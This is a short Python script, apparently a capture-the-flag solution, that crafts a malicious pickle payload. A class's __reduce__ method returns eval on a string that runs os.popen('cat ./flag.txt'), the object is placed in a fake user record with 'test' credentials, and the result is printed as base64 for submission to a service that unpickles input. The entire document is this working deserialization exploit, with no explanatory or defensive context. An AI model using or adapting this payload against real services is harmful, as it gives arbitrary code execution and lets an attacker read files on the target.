import pickle, os, base64


class Vuln(object):
    def __reduce__(self):
        command = "os.popen('cat ./flag.txt').read()"
        return (eval, (command,))


info = {
    "name": Vuln(),
    "userid": "test",
    "password": "test",
}

pickleData = base64.b64encode(pickle.dumps(info)).decode("utf8")
print(pickleData)